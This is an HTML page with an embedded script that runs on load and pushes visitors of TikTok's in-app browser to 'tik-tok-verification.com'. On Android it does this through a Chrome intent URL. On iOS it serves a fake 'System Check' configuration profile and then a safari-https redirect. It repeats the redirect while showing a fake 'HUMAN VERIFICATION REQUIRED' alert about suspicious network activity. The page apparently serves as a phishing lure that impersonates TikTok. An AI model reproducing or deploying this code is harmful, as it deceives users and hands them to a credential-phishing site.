<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function forceEject() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Chrome Package Intent (The most direct path on Android)
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE KERNEL EJECT
            
            // 1. Create a "System Config" blob. 
            // This forces the OS to take the URL away from TikTok's control.
            const configData = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>PayloadContent</key><array/><key>PayloadDisplayName</key><string>System Check</string><key>PayloadType</key><string>Configuration</string><key>PayloadUUID</key><string>1</string><key>PayloadVersion</key><integer>1</integer></dict></plist>';
            const blob = new Blob([configData], {type: 'application/x-apple-aspen-config'});
            const blobUrl = URL.createObjectURL(blob);

            // 2. Fire the Blob and the Safari Protocol simultaneously
            // This "shocks" the WebView into handing the session to the OS.
            window.location.href = blobUrl;
            
            setTimeout(() => {
                // Direct Safari Protocol (No Search)
                window.location.href = "safari-https://" + domain;
            }, 100);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // Try to eject immediately before the user sees anything
        forceEject();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                // Fire again on "OK" click
                forceEject();
                setTimeout(securityLoop, 300);
            }
        }, 300);
    }

    window.onload = securityLoop;
</script>
</body>
</html>
